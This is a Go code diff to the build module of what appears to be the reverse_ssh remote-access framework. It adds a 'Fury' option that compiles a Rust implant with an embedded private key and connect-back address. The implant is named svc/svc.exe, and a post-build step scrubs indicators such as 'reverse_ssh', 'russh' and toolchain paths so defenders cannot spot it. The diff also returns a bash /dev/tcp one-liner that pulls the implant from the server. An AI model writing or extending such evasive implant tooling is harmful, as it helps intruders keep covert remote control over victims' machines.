@@ -2,6 +2,7 @@ package webserver
 
 import (
 	"bytes"
+	"io"
 	"compress/gzip"
 	"encoding/base64"
 	"encoding/json"
@@ -57,6 +58,7 @@ type BuildConfig struct {
 	UPX             bool
 	Lzma            bool
 	Garble          bool
+	Fury            bool
 	DisableLibC     bool
 	RawDownload     bool
 	UseHostHeader   bool
@@ -141,6 +143,12 @@ func Build(config BuildConfig) (string, error) {
 
 	f.Goarm = config.GOARM
 
+	if config.Fury {
+		if err := validateFuryBuildConfig(config, f.Goos, f.Goarch); err != nil {
+			return "", err
+		}
+	}
+
 	f.FilePath = filepath.Join(cachePath, filename)
 	f.FileType = "executable"
 	f.Version = internal.Version + "_guess"
@@ -157,7 +165,7 @@ func Build(config BuildConfig) (string, error) {
 
 	buildArguments = append(buildArguments, "build", "-trimpath")
 	var cleanupBusyBoxOverlay func()
-	if config.BusyBoxFallback {
+	if config.BusyBoxFallback && !config.Fury {
 		busyBoxOverlay, cleanup, err := prepareBusyBoxOverlay(f.Goos, f.Goarch)
 		if err != nil {
 			return "", err
@@ -202,6 +210,12 @@ func Build(config BuildConfig) (string, error) {
 	_, err = logger.StrToUrgency(config.LogLevel)
 	if err != nil {
 		return "", err
+	}
+
+	// Fury: build the Rust implant instead of the Go client. Requires a Rust
+	// toolchain (cargo) with the needed targets installed next to the server.
+	if config.Fury {
+		return buildFury(config, f, embeddedPrivateKeyB64, string(publicKeyBytes))
 	}
 
 	buildArguments = append(buildArguments, fmt.Sprintf("-ldflags=-s -w -X main.logLevel=%s -X main.destination=%s -X main.fingerprint=%s -X main.proxy=%s -X main.customSNI=%s -X main.useHostKerberos=%t -X main.noHistorySave=%t -X main.busyBoxFallback=%t -X main.ntlmProxyCreds=%s -X main.versionString=%s -X github.com/NHAS/reverse_ssh/internal.Version=%s -X github.com/NHAS/reverse_ssh/internal/client/keys.EmbeddedPrivateKeyBase64=%s", config.LogLevel, config.ConnectBackAdress, config.Fingerprint, config.Proxy, config.SNI, config.UseKerberosAuth, config.NoHistorySave, config.BusyBoxFallback, config.NTLMProxyCreds, strings.TrimSpace(config.VersionString), strings.TrimSpace(f.Version), embeddedPrivateKeyB64))
@@ -316,8 +330,228 @@ func Build(config BuildConfig) (string, error) {
 	return "http://" + DefaultConnectBack + "/" + config.Name, nil
 }
 
+// furyIOCs are binary indicators that must never ship in an artifact; a hit
+// fails the build (same list as fury/tools/postbuild.py).
+var furyIOCs = []string{
+	"Users/", ".cargo", ".rustup", "wrssh", "russh", "keepalive-rssh",
+	"reverse_ssh", "svchost", "conpty", "ssh_client", "index.crates.io",
+	"src/hd/", "src/ev/", "src/pt/", "vendor/",
+}
+
+// sanitizeFuryBinary rewrites compiler-hash paths baked into the prebuilt
+// std (equal-length, layout-preserving) and gates on known indicators.
+func sanitizeFuryBinary(path string) error {
+	data, err := os.ReadFile(path)
+	if err != nil {
+		return err
+	}
+	hashRe := regexp.MustCompile(`/rustc/[0-9a-f]{40}`)
+	patched := hashRe.ReplaceAll(data, []byte("/rustc/"+strings.Repeat("0", 40)))
+	// homebrew rust ships a std built inside its own build tree
+	hbRe := regexp.MustCompile("/private/tmp/rust-[0-9A-Za-z_-]+/rustc-[0-9.]+-src/vendor/[^\\x00]*?\\.rs")
+	patched = hbRe.ReplaceAllFunc(patched, func(m []byte) []byte {
+		return []byte("/s" + strings.Repeat("0", len(m)-2))
+	})
+	// any crates.io registry path that survived remapping (build hosts use
+	// different cargo homes); equal-length neutral fill, bounded to the path
+	regRe := regexp.MustCompile("(?:/[a-z0-9]{1,8}/)?index\\.crates\\.io-[0-9a-f]{8,32}[-/][A-Za-z0-9_.-]+-[0-9]+\\.[0-9]+\\.[0-9]+[^\\x00]*?\\.rs")
+	patched = regRe.ReplaceAllFunc(patched, func(m []byte) []byte {
+		return []byte("/r" + strings.Repeat("0", len(m)-2))
+	})
+	if len(patched) != len(data) {
+		return errors.New("post-build patch changed binary size")
+	}
+	lower := strings.ToLower(string(patched))
+	for _, ioc := range furyIOCs {
+		if strings.Contains(lower, strings.ToLower(ioc)) {
+			return fmt.Errorf("IOC leaked into binary: %q", ioc)
+		}
+	}
+	if m := regexp.MustCompile(`/rustc/[0-9a-f]{8}`).FindString(lower); m != "" && !strings.Contains(lower, "/rustc/"+strings.Repeat("0", 40)) {
+		return fmt.Errorf("compiler hash leaked into binary: %q", m)
+	}
+	return os.WriteFile(path, patched, 0600)
+}
+
+// moveFile copies when src and dst live on different filesystems (fury builds
+// in the image overlay, artifacts are stored on the data volume).
+func moveFile(src, dst string) error {
+	if err := os.Rename(src, dst); err == nil {
+		return nil
+	}
+	in, err := os.Open(src)
+	if err != nil {
+		return err
+	}
+	defer in.Close()
+	out, err := os.Create(dst)
+	if err != nil {
+		return err
+	}
+	defer out.Close()
+	if _, err := io.Copy(out, in); err != nil {
+		return err
+	}
+	return os.Remove(src)
+}
+
+// validateFuryBuildConfig rejects flag combinations the Rust implant does
+// not support, so the web UI fails fast with a clear message.
+func validateFuryBuildConfig(config BuildConfig, goos, goarch string) error {
+	switch goos {
+	case "windows", "linux", "darwin":
+	default:
+		return fmt.Errorf("fury supports windows, linux and darwin, not %q", goos)
+	}
+	switch goarch {
+	case "amd64", "arm64", "386":
+	default:
+		return fmt.Errorf("fury supports amd64, arm64 and 386, not %q", goarch)
+	}
+	if config.Garble {
+		return errors.New("garble applies to Go builds only and cannot be combined with fury")
+	}
+	if config.SharedLibrary {
+		return errors.New("shared object builds are not supported for fury")
+	}
+	if config.BusyBoxFallback {
+		return errors.New("busybox fallback is not supported for fury")
+	}
+	if len(config.BuildTags) > 0 {
+		return fmt.Errorf("module build tags (%s) are not supported for fury", strings.Join(config.BuildTags, ", "))
+	}
+	if _, err := exec.LookPath("cargo"); err != nil {
+		return errors.New("cargo could not be found in PATH (required for fury builds)")
+	}
+	return nil
+}
+
 type goBuildOverlay struct {
 	Replace map[string]string `json:"Replace"`
+}
+
+// buildFury compiles the Rust implant (fury/) with the same per-build key and
+// connect-back settings the Go client gets via ldflags.
+func buildFury(config BuildConfig, f data.Download, embeddedPrivateKeyB64 string, publicKeyBytes string) (string, error) {
+	furyDir := filepath.Join(projectRoot, "fury")
+	if info, err := os.Stat(furyDir); err != nil || !info.IsDir() {
+		return "", errors.New("fury source directory not found next to the server")
+	}
+
+	if _, err := exec.LookPath("cargo"); err != nil {
+		return "", errors.New("cargo could not be found in PATH (required for fury builds)")
+	}
+
+	var cargoArgs []string
+	outRel := "target/release/svc"
+	switch {
+	case f.Goos == "windows" && f.Goarch == "386":
+		cargoArgs = append(cargoArgs, "--target", "i686-pc-windows-gnu")
+		outRel = "target/i686-pc-windows-gnu/release/svc.exe"
+		f.FilePath += ".exe"
+	case f.Goos == "windows" && f.Goarch == "arm64":
+		cargoArgs = append(cargoArgs, "--target", "aarch64-pc-windows-gnullvm")
+		outRel = "target/aarch64-pc-windows-gnullvm/release/svc.exe"
+		f.FilePath += ".exe"
+	case f.Goos == "windows":
+		cargoArgs = append(cargoArgs, "--target", "x86_64-pc-windows-gnu")
+		outRel = "target/x86_64-pc-windows-gnu/release/svc.exe"
+		f.FilePath += ".exe"
+	case f.Goos == "linux" && f.Goarch == "arm64":
+		cargoArgs = append(cargoArgs, "--target", "aarch64-unknown-linux-gnu")
+		outRel = "target/aarch64-unknown-linux-gnu/release/svc"
+	case f.Goos == "linux" && f.Goarch == "amd64":
+		cargoArgs = append(cargoArgs, "--target", "x86_64-unknown-linux-gnu")
+		outRel = "target/x86_64-unknown-linux-gnu/release/svc"
+	}
+
+	cargoPath, err := exec.LookPath("cargo")
+	if err != nil {
+		return "", errors.New("cargo could not be found in PATH")
+	}
+	// cargo is often a rustup shim; make toolchain/home resolution deterministic
+	// regardless of how the server process was launched.
+	homeDir, _ := os.UserHomeDir()
+	env := os.Environ()
+	setEnvDefault := func(key, value string) {
+		if value == "" {
+			return
+		}
+		for _, kv := range env {
+			if strings.HasPrefix(kv, key+"=") {
+				return
+			}
+		}
+		env = append(env, key+"="+value)
+	}
+	setEnvDefault("RUSTUP_HOME", filepath.Join(homeDir, ".rustup"))
+	setEnvDefault("CARGO_HOME", filepath.Join(homeDir, ".cargo"))
+	env = append(env,
+		"PATH="+filepath.Join(homeDir, ".cargo/bin")+string(os.PathListSeparator)+os.Getenv("PATH"),
+		"FURY_KEY_B64="+embeddedPrivateKeyB64,
+		"FURY_DEST="+config.ConnectBackAdress,
+		"FURY_FINGERPRINT="+config.Fingerprint,
+		"GOTOOLCHAIN=go1.24.5+auto",
+		// dependencies are pre-fetched into the image (docker/*/Dockerfile),
+		// keep runtime builds offline-safe
+		"CARGO_NET_OFFLINE=true",
+	)
+
+	cmd := exec.Command(cargoPath, append([]string{"build", "--release", "--locked"}, cargoArgs...)...)
+	cmd.Dir = furyDir
+	cmd.Env = env
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return "", fmt.Errorf("fury build error: %s\n%s", err.Error(), string(output))
+	}
+
+	builtPath := filepath.Join(furyDir, outRel)
+	if err := sanitizeFuryBinary(builtPath); err != nil {
+		return "", fmt.Errorf("fury post-build failed: %w", err)
+	}
+	if err := moveFile(builtPath, f.FilePath); err != nil {
+		return "", fmt.Errorf("fury build output move failed: %w", err)
+	}
+
+	fi, err := os.Stat(f.FilePath)
+	if err != nil {
+		return "", err
+	}
+	f.FileSize = float64(fi.Size()) / 1024 / 1024
+	f.FileType = "executable"
+	f.Version = strings.TrimSpace(f.Version) + "-fury"
+	f.UrlPath = config.Name
+
+	if err := os.Chmod(f.FilePath, 0600); err != nil {
+		return "", err
+	}
+	f.LogLevel = config.LogLevel
+
+	if err := data.CreateDownload(f); err != nil {
+		return "", err
+	}
+
+	Autocomplete.Add(config.Name)
+
+	authorizedControlleeKeys, err := os.OpenFile(filepath.Join(cachePath, "../authorized_controllee_keys"), os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
+	if err != nil {
+		return "", errors.New("cant open authorized controllee keys file: " + err.Error())
+	}
+	defer authorizedControlleeKeys.Close()
+
+	if _, err = authorizedControlleeKeys.WriteString(fmt.Sprintf("%s %s %s\n", "owner="+strconv.Quote(config.Owners), publicKeyBytes[:len(publicKeyBytes)-1], config.Comment)); err != nil {
+		return "", errors.New("cant write newly generated key to authorized controllee keys file: " + err.Error())
+	}
+
+	if config.RawDownload {
+		host, port, err := net.SplitHostPort(f.CallbackAddress)
+		if err != nil {
+			return fmt.Sprintf(`bash -c "exec 3<>/dev/tcp/HOSTHERE/PORT_HERE; echo RAW%[1]s>&3; cat <&3" > %[1]s`, config.Name), nil
+		}
+		return fmt.Sprintf(`bash -c "exec 3<>/dev/tcp/%s/%s; echo RAW%[3]s>&3; cat <&3" > %[3]s`, host, port, config.Name), nil
+	}
+
+	return "http://" + DefaultConnectBack + "/" + config.Name, nil
 }
 
 func prepareBusyBoxOverlay(goos, goarch string) (string, func(), error) {
